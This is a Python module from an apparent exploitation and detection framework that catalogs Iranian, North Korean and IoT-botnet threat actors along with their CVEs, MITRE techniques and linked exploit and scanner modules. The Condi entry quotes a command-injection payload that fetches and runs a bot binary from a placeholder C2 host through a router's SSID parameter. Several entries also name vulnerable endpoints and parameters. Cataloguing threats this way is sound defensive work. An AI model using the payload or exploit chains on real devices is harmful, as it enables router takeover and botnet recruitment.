# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
"""APT catalog: Iran, DPRK, and botnet threat actors."""

from embedxpl.core.apt_catalog._models import APT_CATALOG, APTGroup, APTAttack


def _register_other() -> None:
    """APT catalog: Iran, DPRK, and botnet threat actors."""

    # ------------------------------------------------------------------ #
    # APT33 / Elfin (Iran -- IRGC)                                        #
    # ------------------------------------------------------------------ #
    APT_CATALOG["apt33"] = APTGroup(
        id="apt33",
        name="APT33 / Elfin",
        aliases=["Refined Kitten", "Peach Sandstorm", "MAGNALLIUM", "Holmium"],
        country="Iran",
        mitre_id="G0064",
        description=(
            "Iran IRGC-linked APT targeting aerospace, energy, petrochemical, and defense sectors. "
            "Deployed Shamoon wiper against Saudi Aramco (2012, 2016, 2017). "
            "Mass password spraying against Azure tenants (2024)."
        ),
        campaigns=["Shamoon/DistTrack (2012, 2016, 2017)", "Azure Password Spraying (2024)", "CVE-2024-24919 Exploitation"],
        references=["https://attack.mitre.org/groups/G0064/"],
        attacks=[
            APTAttack(
                name="Check Point Security Gateway Information Disclosure (CVE-2024-24919)",
                description=(
                    "CVSS 8.6 unauthenticated information disclosure in Check Point Security Gateway, "
                    "Quantum Spark, CloudGuard. Allows attacker to read arbitrary files including /etc/shadow. "
                    "APT33 exploited to harvest VPN credentials."
                ),
                cves=["CVE-2024-24919"],
                modules=["exploits/firewalls/checkpoint/security_gateway_info_disclosure_cve_2024_24919"],
                mitre_techniques=["T1190", "T1552.001"],
                target_devices=["Check Point Security Gateway", "Quantum Spark", "CloudGuard"],
                phase="Credential Access",
                requires_auth=False,
            ),
        ],
    )

    # ------------------------------------------------------------------ #
    # APT34 / OilRig (Iran -- MOIS)                                       #
    # ------------------------------------------------------------------ #
    APT_CATALOG["apt34"] = APTGroup(
        id="apt34",
        name="APT34 / OilRig",
        aliases=["Helix Kitten", "Chrysene", "Crambus", "COBALT GYPSY", "Earth Simnavaz", "Hazel Sandstorm", "EUROPIUM"],
        country="Iran",
        mitre_id="G0049",
        description=(
            "Iran MOIS-linked APT targeting telecom, energy, government in Middle East. "
            "Uses DNS tunneling (DNSExfiltration) via compromised recursive resolvers and routers. "
            "2024 campaign against UAE government used StealHook to exfiltrate Exchange credentials."
        ),
        campaigns=["Operation SilkBean", "DNSExfiltration Operations", "UAE Government Campaign (2024)"],
        references=["https://attack.mitre.org/groups/G0049/"],
        attacks=[
            APTAttack(
                name="DNS-based C2 via Compromised Routers (DNSExfiltration)",
                description=(
                    "APT34 hijacks DNS resolution on compromised routers to tunnel C2 traffic. "
                    "QUADAGENT and StealHook backdoors use DNS over HTTPS through compromised resolvers."
                ),
                cves=[],
                modules=[
                    "generic/dns/dns_hijack_detector",
                    "exploits/routers/multi/dns_change_cve_based",
                ],
                mitre_techniques=["T1071.004", "T1565.002"],
                target_devices=["SOHO Routers with DNS forwarding", "ISP CPEs"],
                phase="Command and Control",
                requires_auth=True,
            ),
        ],
    )

    # ------------------------------------------------------------------ #
    # MuddyWater (Iran -- MOIS)                                           #
    # ------------------------------------------------------------------ #
    APT_CATALOG["muddywater"] = APTGroup(
        id="muddywater",
        name="MuddyWater",
        aliases=["Static Kitten", "Seedworm", "Earth Vetala", "TEMP.Zagros", "MERCURY", "Mango Sandstorm"],
        country="Iran",
        mitre_id="G0069",
        description=(
            "Iran MOIS-linked APT actively scanning and exploiting internet-exposed Ivanti, "
            "FortiGate, and VPN appliances targeting telecom, defense, and government in the Middle East and US."
        ),
        campaigns=["Ivanti Mass Exploitation (2024)", "Fakeset/Dindoor Pre-positioning (2026)"],
        references=[
            "https://www.cisa.gov/news-events/cybersecurity-advisories/aa22-055a",
            "https://nvd.nist.gov/vuln/detail/CVE-2023-46805",
        ],
        attacks=[
            APTAttack(
                name="Ivanti Connect Secure Auth Bypass (CVE-2023-46805) + Command Injection (CVE-2024-21887)",
                description=(
                    "MuddyWater uses Shodan/Nuclei to identify internet-exposed Ivanti devices, "
                    "then exploits the auth bypass + command injection chain for initial access."
                ),
                cves=["CVE-2023-46805", "CVE-2024-21887"],
                modules=[
                    "exploits/vpn/ivanti/connect_secure_auth_bypass_cve_2023_46805",
                    "exploits/vpn/ivanti/connect_secure_cmd_injection_cve_2024_21887",
                ],
                mitre_techniques=["T1190", "T1595"],
                target_devices=["Ivanti Connect Secure", "Ivanti Policy Secure"],
                phase="Initial Access",
                requires_auth=False,
            ),
        ],
    )

    # ------------------------------------------------------------------ #
    # LAZARUS GROUP / APT38 (North Korea)                                 #
    # ------------------------------------------------------------------ #
    APT_CATALOG["lazarus"] = APTGroup(
        id="lazarus",
        name="Lazarus Group / APT38",
        aliases=["Hidden Cobra", "ZINC", "Labyrinth Chollima", "TraderTraitor", "Bureau 121"],
        country="North Korea",
        mitre_id="G0032",
        description=(
            "North Korea RGB Bureau 121. Primarily financial theft (crypto exchanges, SWIFT) and "
            "espionage. Uses compromised SOHO routers and NAS devices as proxy C2 infrastructure "
            "to obscure DPRK attribution."
        ),
        campaigns=["TraderTraitor Crypto Heists (2021-2025)", "3CX Supply Chain (2023)", "AppleJeus Crypto Exchange Attacks"],
        references=["https://us-cert.cisa.gov/ncas/alerts/aa22-108a"],
        attacks=[
            APTAttack(
                name="SOHO Router / NAS C2 Proxy Infrastructure",
                description=(
                    "Lazarus compromises SOHO routers and NAS devices (especially in Eastern Europe and SE Asia) "
                    "as proxy nodes to route C2 traffic and obscure DPRK origin. "
                    "MikroTik RouterOS and QNAP NAS are frequently represented."
                ),
                cves=["CVE-2018-14847"],
                modules=[
                    "exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure",
                    "creds/routers/mikrotik/ssh_default_creds",
                ],
                mitre_techniques=["T1090.003", "T1584.008"],
                target_devices=["MikroTik RouterOS", "QNAP NAS", "Linksys", "generic SOHO routers"],
                phase="Command and Control (Infrastructure Setup)",
                requires_auth=False,
            ),
        ],
    )

    # ------------------------------------------------------------------ #
    # KIMSUKY (North Korea -- RGB)                                         #
    # ------------------------------------------------------------------ #
    APT_CATALOG["kimsuky"] = APTGroup(
        id="kimsuky",
        name="Kimsuky",
        aliases=["Springtail", "ARCHIPELAGO", "Black Banshee", "Thallium", "Velvet Chollima", "APT43"],
        country="North Korea",
        mitre_id="G0094",
        description=(
            "North Korea RGB 3rd Bureau. Primarily spear-phishing and credential theft. "
            "Exploits Log4j and ManageEngine CVEs for initial access to enterprise systems "
            "adjacent to network infrastructure."
        ),
        campaigns=["Global Espionage Campaign (CISA AA24-207A)", "South Korea Defense Targeting"],
        references=["https://www.cisa.gov/sites/default/files/2024-08/aa24-207a-dprk-cyber-group-conducts-global-espionage-campaign_0.pdf"],
        attacks=[
            APTAttack(
                name="Log4Shell Exploitation (CVE-2021-44228)",
                description=(
                    "Kimsuky exploits Log4j vulnerabilities in web-facing Java applications "
                    "that are often co-located with network management infrastructure."
                ),
                cves=["CVE-2021-44228"],
                modules=["exploits/misc/multi/log4shell_rce_cve_2021_44228"],
                mitre_techniques=["T1190"],
                target_devices=["Any Java application server with Log4j 2.0-2.14.1"],
                phase="Initial Access",
                requires_auth=False,
            ),
        ],
    )

    # -----------------------------------------------------------------------
    # Botnet threat actors -- Mirai, Condi, Mozi
    # -----------------------------------------------------------------------

    APT_CATALOG["mirai_botnet"] = APTGroup(
        id="mirai_botnet",
        name="Mirai Botnet",
        aliases=["Mirai", "Okiru", "Satori", "Masuta", "PureMasuta", "Wicked", "Sylveon",
                 "OMG", "Fbot", "Mozi (Mirai lineage)", "IZ1H9"],
        country="Unknown (multiple operators)",
        description=(
            "Mirai is an IoT botnet first identified in 2016, whose source code was "
            "publicly released enabling dozens of variants. It scans for devices with "
            "default/weak Telnet credentials (port 23/2323) and deploys ELF binaries "
            "to recruit them into a DDoS mesh. Responsible for record-breaking "
            "DDoS attacks (Dyn DNS, OVH, KrebsOnSecurity). Still actively exploited "
            "in 2025 via CVE-2023-33538 (TP-Link), CVE-2023-1389 (AX21), and dozens "
            "of additional SOHO router vulnerabilities. CISA KEV references multiple "
            "Mirai-exploited CVEs."
        ),
        campaigns=[
            "Dyn DNS DDoS (Oct 2016, ~1.2 Tbps)",
            "OVH DDoS (Sep 2016, ~1 Tbps)",
            "Satori/Okiru (2017-2018, Huawei CVE-2017-17215)",
            "Condi/IZ1H9 TP-Link campaigns (2023-2025)",
        ],
        references=[
            "https://unit42.paloaltonetworks.com/mirai-botnet/",
            "https://krebsonsecurity.com/2016/10/source-code-for-iot-attack-tool-mirai-released/",
            "https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-antonakakis.pdf",
            "https://github.com/jgamblin/Mirai-Source-Code",
        ],
        mitre_id="G0000",
        attacks=[
            APTAttack(
                name="Mirai Default Credential Telnet Sweep",
                description=(
                    "Scans the IPv4 space for Telnet (23/2323) and tests 62 hardcoded "
                    "factory-default credential pairs.  Successful login results in "
                    "device recruitment into the botnet mesh.  Credential table extracted "
                    "from mirai/bot/scanner.c in the original source release."
                ),
                cves=[],
                modules=[
                    "scanners/threat_detection/mirai_default_creds_sweep",
                    "scanners/threat_detection/mirai_infection_scan",
                ],
                mitre_techniques=["T1078.001", "T1110.001", "T1133"],
                target_devices=[
                    "Generic IoT / SOHO Routers",
                    "IP Cameras / DVR / NVR",
                    "Network Switches",
                ],
                phase="Initial Access -- Credential Abuse",
                requires_auth=False,
            ),
            APTAttack(
                name="TP-Link WR940N/WR740N/WR841N SSID Command Injection (CVE-2023-33538)",
                description=(
                    "Authenticated command injection in TP-Link SOHO routers via the "
                    "/userRpm/WlanNetworkRpm ssid1 parameter.  Firmware does not sanitise "
                    "user-supplied SSID values, allowing shell metacharacter injection "
                    "executed as root.  Actively exploited by Mirai/Condi (2025, CISA KEV)."
                ),
                cves=["CVE-2023-33538"],
                modules=["exploits/routers/tplink/wr940n_740n_841n_ssid_cmd_injection_cve_2023_33538"],
                mitre_techniques=["T1190", "T1059.004"],
                target_devices=["TP-Link TL-WR940N", "TP-Link TL-WR740N", "TP-Link TL-WR841N"],
                phase="Initial Access -- Exploitation",
                requires_auth=True,
            ),
            APTAttack(
                name="TP-Link Archer AX21 Unauthenticated Command Injection (CVE-2023-1389)",
                description=(
                    "Unauthenticated command injection via the country parameter in the "
                    "TP-Link AX21 locale API (/cgi-bin/luci/;stok=/locale).  No auth "
                    "required; widely exploited by Mirai variants for mass router "
                    "recruitment (2023-2025)."
                ),
                cves=["CVE-2023-1389"],
                modules=["exploits/routers/tplink/archer_ax21_unauthenticated_command_injection_cve_2023_1389"],
                mitre_techniques=["T1190", "T1059.004"],
                target_devices=["TP-Link Archer AX21"],
                phase="Initial Access -- Exploitation",
                requires_auth=False,
            ),
            APTAttack(
                name="Botnet C2 Port Scan and Banner Fingerprinting",
                description=(
                    "Scans for TCP ports associated with Mirai/Condi/Gafgyt C2 channels "
                    "(23, 2323, 7547, 37215, 52869, 8080, 9001, 6667, 8443, 48101, 46266). "
                    "Fetches banners and correlates against known botnet binary strings."
                ),
                cves=[],
                modules=["scanners/threat_detection/botnet_c2_port_scan"],
                mitre_techniques=["T1571", "T1095", "T1219"],
                target_devices=["Any networked device"],
                phase="Discovery -- C2 Reconnaissance",
                requires_auth=False,
            ),
        ],
    )

    APT_CATALOG["condi_botnet"] = APTGroup(
        id="condi_botnet",
        name="Condi Botnet",
        aliases=["Condi", "Condi-v2", "IZ1H9", "Condi DDoS-as-a-Service"],
        country="Unknown",
        description=(
            "Condi is a Mirai-based DDoS-for-hire botnet first observed in mid-2023, "
            "targeting TP-Link AX21 routers (CVE-2023-1389) and later expanding to "
            "TP-Link WR940N/WR740N/WR841N via CVE-2023-33538.  Condi operators sell "
            "DDoS capacity as a service via Telegram channels.  The malware kills "
            "competing bots and persists across reboots via /etc/rc.d/ or init.d. "
            "CISA KEV listed CVE-2023-33538 in June 2025 due to active Condi exploitation."
        ),
        campaigns=[
            "Condi DDoS-as-a-Service Telegram (2023)",
            "CVE-2023-1389 AX21 mass exploitation (2023)",
            "CVE-2023-33538 WR940N/WR841N campaign (2024-2025)",
        ],
        references=[
            "https://unit42.paloaltonetworks.com/exploitation-of-cve-2023-33538/",
            "https://cybersecuritynews.com/hackers-target-tp-link-routers/",
            "https://www.fortinet.com/blog/threat-research/condi-ddos-botnet",
        ],
        mitre_id="G0000",
        attacks=[
            APTAttack(
                name="TP-Link WR940N/WR741N/WR841N SSID Injection -- Condi Recruitment (CVE-2023-33538)",
                description=(
                    "Condi operators authenticate with default admin:admin credentials and "
                    "inject the Condi ELF arm7 binary URL into ssid1 parameter: "
                    "$(wget http://C2/arm7 -O /tmp/arm7; chmod 777 /tmp/arm7; /tmp/arm7). "
                    "Device is recruited into Condi botnet mesh for DDoS campaigns."
                ),
                cves=["CVE-2023-33538"],
                modules=["exploits/routers/tplink/wr940n_740n_841n_ssid_cmd_injection_cve_2023_33538"],
                mitre_techniques=["T1190", "T1059.004", "T1078.001"],
                target_devices=["TP-Link TL-WR940N v2/v4", "TP-Link TL-WR740N v1/v2", "TP-Link TL-WR841N v8/v10"],
                phase="Initial Access + Execution",
                requires_auth=True,
            ),
            APTAttack(
                name="Condi Infection Indicator Detection",
                description=(
                    "Multi-signal detection of Condi-infected devices: open Telnet ports, "
                    "default credentials, BusyBox banner, and C2 port exposure. "
                    "Correlates with known Condi C2 infrastructure signatures."
                ),
                cves=[],
                modules=[
                    "scanners/threat_detection/mirai_infection_scan",
                    "scanners/threat_detection/botnet_c2_port_scan",
                    "scanners/threat_detection/mirai_default_creds_sweep",
                ],
                mitre_techniques=["T1078.001", "T1571", "T1095"],
                target_devices=["TP-Link SOHO Routers"],
                phase="Detection -- Compromise Assessment",
                requires_auth=False,
            ),
        ],
    )

    APT_CATALOG["mozi_botnet"] = APTGroup(
        id="mozi_botnet",
        name="Mozi Botnet",
        aliases=["Mozi", "Mozi P2P"],
        country="China (suspected)",
        description=(
            "Mozi is a P2P IoT botnet based on a modified BitTorrent DHT (Kademlia) "
            "protocol, first observed in 2019.  Unlike Mirai-family botnets that rely "
            "on centralized C2, Mozi nodes communicate peer-to-peer over UDP port 14836 "
            "and 48101, making it resilient to C2 takedowns.  Primarily targets GPON "
            "routers, Netgear, Huawei, and generic SOHO devices via default credentials "
            "and known CVEs.  In August 2023, a kill-switch was activated (possibly by "
            "Chinese law enforcement), but variants and successors remain active."
        ),
        campaigns=[
            "Mozi DHT botnet (2019-2023)",
            "Mozi successor variants (2023-2025)",
        ],
        references=[
            "https://blog.netlab.360.com/mozi-another-botnet-using-dht/",
            "https://www.trendmicro.com/en_us/research/21/l/mozi-botnet-successor.html",
            "https://securelist.com/mozi-botnet/",
        ],
        mitre_id="G0000",
        attacks=[
            APTAttack(
                name="Mozi DHT Peer Discovery (UDP 14836 / 48101)",
                description=(
                    "Sends a crafted DHT find_node query (BEP-5 bencode format) to the "
                    "target on UDP port 14836 and 48101.  A valid DHT response containing "
                    "'2:id' and '1:y1:r' indicates an active Mozi DHT node.  Mozi nodes "
                    "additionally embed a config block in the 'g' key of the response."
                ),
                cves=[],
                modules=["scanners/threat_detection/mozi_dht_presence_scan"],
                mitre_techniques=["T1095", "T1571", "T1590.001"],
                target_devices=[
                    "Generic IoT / SOHO Routers",
                    "IP Cameras / NAS",
                    "Huawei HG532 / GPON Routers",
                ],
                phase="Discovery -- Botnet Node Detection",
                requires_auth=False,
            ),
        ],
    )
